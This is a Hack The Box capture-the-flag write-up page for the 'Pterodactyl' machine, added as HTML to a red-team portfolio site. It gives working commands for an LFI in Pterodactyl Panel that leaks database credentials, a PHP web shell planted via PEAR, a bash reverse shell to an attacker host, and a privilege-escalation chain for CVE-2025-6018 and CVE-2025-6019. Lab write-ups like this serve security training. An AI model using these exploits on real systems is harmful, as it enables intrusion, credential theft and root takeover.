@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pterodactyl Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Linux Medium</span>
+            <h1>Pterodactyl Writeup</h1>
+            <p><strong>Author:</strong> Koussay Aydi | <strong>Tags:</strong> Linux, LFI, PHP-PEAR, RCE, CVE-2025-6018, CVE-2025-6019</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Overview</h2>
+            <p>Pterodactyl is a Medium-difficulty Linux machine that involves exploiting an LFI vulnerability in Pterodactyl Panel v1.11.10 combined with PHP-PEAR to achieve RCE. Initial access as <code>wwwrun</code> leads to lateral movement via password reuse, and root escalation requires chaining two recent CVEs: CVE-2025-6018 and CVE-2025-6019.</p>
+
+            <h2>Machine Information</h2>
+            <ul>
+                <li><strong>Platform:</strong> HackTheBox</li>
+                <li><strong>Difficulty:</strong> Hard</li>
+                <li><strong>OS:</strong> Linux</li>
+                <li><strong>IP Address:</strong> 10.129.3.120</li>
+            </ul>
+
+            <h2>Summary</h2>
+            <p>This machine involves exploiting an LFI vulnerability in Pterodactyl Panel v1.11.10 combined with PHP-PEAR to achieve RCE. After gaining initial access as <code>wwwrun</code>, password reuse allows lateral movement to user <code>phileasfogg3</code>. Root privilege escalation requires chaining two recent CVEs: CVE-2025-6018 (PAM environment injection) and CVE-2025-6019 (udisks2 XFS resize TOCTOU).</p>
+
+            <h2>Reconnaissance</h2>
+            <h3>Nmap Scan</h3>
+            <pre><code>nmap -sV --open 10.129.3.120 -vvv</code></pre>
+            <p><strong>Results:</strong></p>
+            <pre><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx 1.21.5</code></pre>
+            <p><strong>Key Findings:</strong></p>
+            <ul>
+                <li>SSH (22/tcp) - OpenSSH 9.6</li>
+                <li>HTTP (80/tcp) - nginx 1.21.5</li>
+            </ul>
+
+            <h2>Web Enumeration</h2>
+            <h3>Directory Brute Force</h3>
+            <pre><code>gobuster dir -u http://pterodactyl.htb -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html</code></pre>
+            <p><strong>Notable Findings:</strong></p>
+            <ul>
+                <li><code>changelog.txt</code> - Contains version information and subdomain</li>
+                <li><code>phpinfo.php</code> - Discloses PHP configuration</li>
+                <li><code>index.php</code> - Main landing page</li>
+            </ul>
+
+            <h3>changelog.txt Analysis</h3>
+            <pre><code>MonitorLand - CHANGELOG.txt
+======================================
+...
+[Installed] Pterodactyl Panel v1.11.10
+...
+[Linked] Subdomain Configuration
+- Added DNS and reverse proxy routing for play.pterodactyl.htb.
+...
+[Enhanced] PHP Capabilities
+- Enabled PHP-FPM ...
+- Enabled PHP-PEAR ...
+- Added temporary PHP debugging via phpinfo()</code></pre>
+            <p><strong>Intelligence Gathered:</strong></p>
+            <ul>
+                <li>Pterodactyl Panel v1.11.10 (not vulnerable to CVE-2023-39390)</li>
+                <li>Subdomain: <code>play.pterodactyl.htb</code></li>
+                <li>PHP-PEAR is installed</li>
+            </ul>
+
+            <h3>phpinfo.php Analysis</h3>
+            <pre><code>curl -s http://pterodactyl.htb/phpinfo.php | grep -Ei "document_root|script_filename|include_path"</code></pre>
+            <p><strong>Output:</strong></p>
+            <pre><code>include_path = .:/usr/share/php8:/usr/share/php/PEAR
+$_SERVER['SCRIPT_FILENAME'] = /var/www/html/phpinfo.php
+$_SERVER['DOCUMENT_ROOT'] = /var/www/html</code></pre>
+            <p><strong>Critical Information:</strong></p>
+            <ul>
+                <li>PHP-PEAR include path: <code>/usr/share/php/PEAR</code></li>
+                <li>Document root: <code>/var/www/html</code></li>
+            </ul>
+
+            <h2>Initial Foothold</h2>
+            <h3>Vulnerability Overview</h3>
+            <p>The presence of <code>include_path</code> pointing to <code>/usr/share/php/PEAR</code> creates an attack vector. Pterodactyl Panel includes a vulnerable endpoint <code>/locales/locale.json</code> that allows directory traversal through the <code>locale</code> parameter, which can be combined with PEAR's <code>pearcmd.php</code> to achieve code execution.</p>
+
+            <h3>Step 1: Verify LFI and Leak Database Credentials</h3>
+            <pre><code>curl -H "Host: panel.pterodactyl.htb" \
+  "http://10.129.3.120/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"</code></pre>
+            <p><strong>Response:</strong></p>
+            <pre><code>{
+  "connections": {
+    "mysql": {
+      "host": "127.0.0.1",
+      "port": "3306",
+      "database": "panel",
+      "username": "pterodactyl",
+      "password": "PteraPanel"
+    }
+  }
+}</code></pre>
+            <p><strong>Credentials Found:</strong> <code>pterodactyl:PteraPanel</code></p>
+
+            <h3>Step 2: Write PHP Web Shell Using PEAR Download</h3>
+            <p><strong>Setup HTTP Server on Kali:</strong></p>
+            <pre><code>echo '&lt;?php system($_GET[0]); ?&gt;' &gt; shell.php
+python3 -m http.server 80</code></pre>
+            <p><strong>Trigger PEAR Download:</strong></p>
+            <pre><code>curl --globoff \
+  "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+download+http://&lt;KALI_IP&gt;/shell.php"</code></pre>
+            <p><strong>Error Message Reveals Save Location:</strong></p>
+            <pre><code>Could not get contents of package "/var/www/pterodactyl/public/shell.php". Invalid tgz file.</code></pre>
+            <p>The file was written to <code>/var/www/pterodactyl/public/shell.php</code></p>
+
+            <h3>Step 3: Verify Command Execution</h3>
+            <pre><code>curl "http://panel.pterodactyl.htb/shell.php?0=id"</code></pre>
+            <p><strong>Output:</strong></p>
+            <pre><code>uid=474(wwwrun) gid=477(www) groups=477(www)</code></pre>
+            <p>✅ <strong>RCE Achieved as <code>wwwrun</code></strong></p>
+
+            <h2>User Shell and User Flag</h2>
+            <h3>Reverse Shell</h3>
+            <p><strong>Trigger Reverse Shell:</strong></p>
+            <pre><code>curl "http://panel.pterodactyl.htb/shell.php?0=bash -c 'bash -i >& /dev/tcp/&lt;KALI_IP&gt;/4444 0>&1'"</code></pre>
+            <p><strong>Listener on Kali:</strong></p>
+            <pre><code>nc -lnvp 4444</code></pre>
+            <p>✅ <strong>Interactive Shell as <code>wwwrun</code></strong></p>
+
+            <h3>Lateral Movement to phileasfogg3</h3>
+            <p><strong>Password Reuse Exploitation:</strong></p>
+            <pre><code>su - phileasfogg3
+# Password: PteraPanel</code></pre>
+            <p>✅ <strong>Successfully switched to user <code>phileasfogg3</code></strong></p>
+
+            <h3>User Flag</h3>
+            <pre><code>ssh phileasfogg3@10.129.3.120
+cat /home/phileasfogg3/user.txt</code></pre>
+
+            <h2>Privilege Escalation</h2>
+            <p>The privilege escalation exploits two chained CVEs:</p>
+            <ul>
+                <li><strong>CVE-2025-6018</strong> - PAM environment variable injection to spoof a local session</li>
+                <li><strong>CVE-2025-6019</strong> - TOCTOU in udisks2 XFS resize, allowing nosuid bypass</li>
+            </ul>
+
+            <h3>Step 1: Session Spoofing (CVE-2025-6018)</h3>
+            <p><strong>Create PAM Environment File:</strong></p>
+            <pre><code>echo 'XDG_SEAT DEFAULT="seat0"' &gt; ~/.pam_environment
+echo 'XDG_VTNR DEFAULT="1"' &gt;&gt; ~/.pam_environment</code></pre>
+            <p><strong>Log out and log back in via SSH.</strong></p>
+            <p><strong>Verify Session Status:</strong></p>
+            <pre><code>loginctl session-status</code></pre>
+            <pre><code>59 - phileasfogg3 (1002)
+           Since: Thu 2026-02-12 00:58:59 EET; 8s ago
+          Leader: 11991 (sshd)
+            Seat: seat0; vc1
+           State: active</code></pre>
+            <p>✅ <strong>Session is now treated as physical console</strong> - Polkit will allow <code>udisksctl</code> without authentication</p>
+
+            <h3>Step 2: XFS Image Race Condition (CVE-2025-6019)</h3>
+            <p>We create a malicious XFS image containing an SUID-root bash binary and exploit a race condition during a resize operation.</p>
+            <pre><code># On Target as phileasfogg3:
+# Background watcher – waits for the temporary /tmp/blockdev* mount
+(while true; do
+    for dev in /tmp/blockdev*; do
+        if [ -d "$dev" ] && [ -x "$dev/bash" ]; then
+            echo "Caught SUID bash at $dev/bash"
+            "$dev/bash" -p -c "id; cat /root/root.txt" &gt; /tmp/root_out.txt 2&gt;&amp;1
+            break 2
+        fi
+    done
+    sleep 0.001
+done) &
+
+# Trigger the resize operation – this creates a temporary mount without nosuid
+gdbus call --system \
+    --dest org.freedesktop.UDisks2 \
+    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+    --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" 2&gt;/dev/null</code></pre>
+
+            <h3>Step 3: Root Flag</h3>
+            <pre><code>cat /root/root.txt</code></pre>
+
+            <h2>Conclusion</h2>
+            <p>The Pterodactyl machine demonstrated a complex attack chain: LFI to RCE via PHP-PEAR, lateral movement via password reuse, and privilege escalation via chained session spoofing and file system race conditions. This highlights the criticality of securing file inclusion endpoints and patching core services like PAM and udisks2.</p>
+
+            <h2>Attack Chain Summary</h2>
+            <pre><code>Web LFI → Database Creds → PEAR RCE → wwwrun Shell → Password Reuse → phileasfogg3 → CVE-2025-6018 (PAM Spoof) → CVE-2025-6019 (udisks2 TOCTOU) → Root Flag</code></pre>
+
+            <h2>Tools Used</h2>
+            <div class="hero-meta" style="background: none; border: none; padding: 0;">
+                <code>nmap</code> <code>gobuster</code> <code>PHP-PEAR</code> <code>curl</code> <code>python3</code> <code>gdbus</code> <code>udisksctl</code>
+            </div>
+            
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
